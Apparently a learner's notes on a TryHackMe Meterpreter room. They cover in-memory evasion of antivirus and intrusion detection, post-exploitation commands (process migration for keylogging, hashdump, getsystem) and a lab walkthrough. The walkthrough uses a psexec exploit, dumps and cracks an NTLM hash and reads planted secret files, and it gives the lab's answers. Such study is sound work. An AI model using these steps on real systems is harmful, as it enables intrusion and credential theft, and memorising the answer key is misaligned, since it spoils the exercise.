# Metasploit: Meterpreter
Deeper dive into Meterpreter and see how in-memory payloads can be used for post-exploitation.

## Content:
[Recall](#recall)
<br>[Task 1: Introduction to Meterpreter](#task-1-introduction-to-meterpreter)
<br>[Task 2: Meterpreter Flavours](#task-2-meterpreter-flavours)
<br>[Task 3: Meterpreter Commands](#task-3-meterpreter-commands)
<br>[Task 4: Post-Exploitation with Meterpreter](#task-4-post-exploitation-with-meterpreter)
<br>[Task 5: Post-Exploitation Challenge](#task-5-post-exploitation-challenge)
<br>[To note](#to-note)

## Recall
<ul>
<li><b>Metasploit =</b> Full exploitation framework that provides modules for scanning, epxploiting, post-exploitation, auxiliary features etc. Contains payloads, encoders, exploits, listeners etc.</li>
<li><b>Meterpreter =</b> One specific payload inside Metasploit. Post-exploitation, in-memory agent/ shell that gives attacker interactive control over compromised host. Delivered as a payload by an exploit (or by other delivery mechanisms).</li>
<li><b>msfvenom</b> = Command-line utility inside Metasploit useed to generate payload files, e.g. shellcode, EXEs, APKs, scripts etc.</li>
</ul>


## Task 1: Introduction to Meterpreter
This section is to show how stealthy Meterpreter is running, not the techniques and tools that can be used to detect Meterpreter. Also, most AV software CAN detect Meterpreter.

| Term | Description |
|------|-------------|
| Meterpreter | Metasploit payload that supports penetration testing process with many compoents. Will run on target system and act as an agent within a C2 architecture. |
| Versions | Different versions will provide different functionalities based on target system. |
| Features | Runs in memory, establishes an encrypted (TLS) communication channel with attacker's system. |

<u><b>How Meterpreter works</b></u>
<p><b>Runs in memory.</b>
<ul>
<li>Meterpreter runs on target system but is not installed on it; runs in memory and does not write itself to disk on target. This feature aims to avoid being detected during AV scans.</li>
<li>By default, most AV software will scan new files on disk (e.g. when you download file from Internet). Meterpreter runs in memory (RAM) to avoid having a file that has to be written to disk on target system (e.g. meterpreter.exe).</li>
<li>This way, Meterpreter will be seen as a process and not have a file on target system.</li>
</ul>
<p><b>Encrypted communication.</b>
<ul>
<li>Meterpreter also aims to avoid detection from network-based IPS and IDS by using encrypted communications with the server where Metasploit runs (your attacking machine).</li>
<li>If target organization doesn't decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of local network, IPS and IDS will not detect its activities.</li>
</ul>
<p><b>Note</b>
<ul>
<li>Meterpreter IS recognized by major AV software, but it still provides some degree of stealth.</li>
</ul>

| Command | Description |
|---------|-------------|
| `getpid` | [Meterpreter] Returns process ID which Meterpreter is running. |
| `ps` | [Meterpreter] Lists processes running on target system. Will see that the PID returned for Meterpreter will NOT be Meterpreter.exe, but spoolsv.exe. |
| `tasklist /m /fi "pid eq 1304` | [Meterpreter] Even if checking DLLS used by the Meterpreter process (spoolsv.exe) will not show anything related to Meterpreter, i.e. meterpreter.dll. |

## Task 2: Meterpreter Flavours
<ul>
<li>Recall: Metasploit payloads come in 2 categories:</li>
</ul>

| Categories | Description |
|------------|-------------|
| Inline/ Single | Inline payloads are sent in a single step. |
| Staged | Staged payloads are sent to target in 2 steps. Initial part is installed (=stager) and requests the rest of the payload; allows for smaller initial payload size. |
<ul>
<li>Meterpreter payloads are also divided into staged and inline. BUT has a wide range of different versions to choose based on target system.</li>
<li>To list all available Meterpreter versions: [Regular command prompt]] <code>msfvenom --list payloads | grep meterpreter</code></li>
<li>Meterpreter versions are available for these platforms: Android, Apple iOS, Java, Linux, OSX, PHP, Python, Windows.</li>
<li>Decision on which version of Meterpreter to used depends on:</li>
</ul>

| Factor | Example questions |
|--------|-------------|
| Target operating system | Linux or Windows? Mac device? Android phone? etc. |
| Components available on target system | Is Python installed? Is it a PHP website? etc. |
| Network connection types that can have with target system | Do they allow raw TCp connections? Can only have a HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.|

<ul>
<li>Some exploits have default Meterpreter payload, e.g. ms17_010_eternalblue exploit. To see:<br>[msfconsole prompt] <code>use exploit/windows/smb/ms17_010_eternalblue</code><br>[msfconsole prompt] <code>show payloads</code></li>
</ul>

## Task 3: Meterpreter Commands
<ul>
<li>Cannot manually launch Meterpreter; deliver as a payload and spawns automatically once:<ol><li>A Metasploit exploit delivers it; Meterpreter is inside the exploit.</li><li>Manually run a payload generated with msfvenom and a handler is waiting; Meterpreter is a standalone payload generated by msfvenom and it starts when victim runs the payload and handler catches it.</li></li>
</ul>

| Feature | Description |
|---------|-------------|
| Tools | 3 categories: (1) Built-in commands (2) Meterpreter tools (3) Meterpreter scripting |
| Commands | If run `help`, will see commands listed under different categories. Different Meterpreter versions have different commands. Also, commands may seem available on help meny, but whether they work depends on whether they are available on target system. Might also be the case where Meterpreter is being run on a VM without a proper desktop environment. |
| `help` |  List all available commands. Different Meterpreter versions will have different command options, so always run this first. These commands are built-in tools available on Meterpreter; will run on target system w/o loading any additional scripts or executable files. |

## Task 4: Post-Exploitation with Meterpreter

| Commands | Description |
|----------|-------------|
| `help` | List all availble commands in Meterpreter. Different Meterpreter versions will have different options available. Always do this first. |
| `getuid` | Display user with which Meterpreter is currently running. Gives an idea of possible privilege level on target system, e.g. admin level user like NT AUTHORITY\SYSTEM or a regular user. |
| `ps` | List running processes. PID column gives you the PID info you need to migrate Meterpreter to another process. |
| `migrate <PID_of_target_process>` | Migrate to another process to help Meterpreter interact with it. E.g. If see word processor running on target (e.g. word.exe, notepad.exe etc.), can migrate to it and start capturing keystrokes sent by user to this process. Migrating to another process can also help to have a more stable Meterpreter session.<br><br>Be careful that if migrate from higher priveleged user to process started by lower privileged user, might lose user privileges and might not get them back. |
| `hashdump` | List content of SAM database; stores user's passwords on Windows systems, in NTLM format.<br><br>Not mathematically possible to 'crack' the hashes, but can discover cleartext password using online NTLM databases or rainbow table attack. Hashes can also be used in Pass-the-Hash attacks to authenticate other systems that these users can access, on the same network. |
| `search -f flag2.txt` | Locate files. In CTF, can be used to quickly find a flag or proof file. In penetration testing engagements, may need to search for user-generated files or configuration files that may contain password or account information. |
| `shell` | Launch a regular command-line shell on target system. Ctrl+Z will return back to Meterpreter shell. |
| `getsystem` | Attempt to elevate your privilege to that of local system (Windows LocalSystem account or NT AUTHORITY\SYSTEM account, above any user.). |
| `load <additional_tools>` | Load additional tools like Kiwi or Python language. |

## Task 5: Post-Exploitation Challenge

<u><b>THM Questions</b></u>
| Question | Answer |
|---------|---------|
| <i>What is the computer name?</i><br>ACME-TEST| To launch Measploit and simulate initial compromise over SMB:<br>[Regular command prompt] `msfconsole`<br>[msf6] `use exploit/windows/smb/psexec`<br><br>To set the settings needed for exploit:<br>`show options`<br>`set RHOSTS <target_machine_IP>`<br>`set SMBPassword Password1`<br>`set SMBUser ballen`<br><br>To run exploit: `run`<br><br>If Meterpreter prompt shows, exploit is a success.<br>Check available commands: `help`<br>Run: `sysinfo`|
| <i>What is the target domain?</i><br>FLASH | Under `sysinfo`. |
| <i>What is the name of the share likely created by the user?</i><br>speedster | Run shell: `shell`<br>View shares: `net share`<br>Exit shell: `exit`<br><br>Alternative: Put current session in background,then run exploit to enumerate shared folders on a Windows system: post/windows/gather/enum_share.<br>To background current session: Ctrl+Z, `y`<br>Run exploit: `use post/windows/gather/enum_shares`<br>Show options: `show options`<br>List all active sessions: `sessions -l`<br>Set session ID: `set SESSION 1`<br>Run exploit: `run`<br>Go back to previous session: `sessions -i 1` |
| <i>What is the NTLM hash of the jchambers user?</i><br>69596c7aa1e8daee<br>17f8e78870e25a5c | `hashdump` |
| <i>What is the cleartext password of the jchambers user?</i><br>Trustno1  | Used [this](https://hashes.com/en/decrypt/hash). |
| <i>Where is the "secrets.txt"  file located? (Full path of the file)</i><br>c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt | `search -f secrets.txt` |
| <i>What is the Twitter password revealed in the "secrets.txt" file?</i><br>KDSvbsw3849! | `cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt "` |
| <i>Where is the "realsecret.txt" file located? (Full path of the file)</i><br>c:\inetpub\wwwroot\realsecret.txt  | `search -f realsecret.txt` |
| <i>What is the real secret?</i><br>The Flash is the fastest man alive | `cat "c:\inetpub\wwwroot\realsecret.txt"` |

## To note